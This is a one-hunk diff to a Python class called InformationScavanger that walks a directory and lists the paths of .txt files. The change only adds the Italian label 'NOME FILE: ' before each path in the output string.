@@ -306,6 +306,7 @@ class InformationScavanger:
         for root, dirs, files in os.walk(initial_path):
             for file in files:
                 if file.endswith(".txt"):
+                    return_string += "NOME FILE: "
                     return_string += os.path.join(root, file)
                     return_string += "\n#####################################################\n"
                     try:
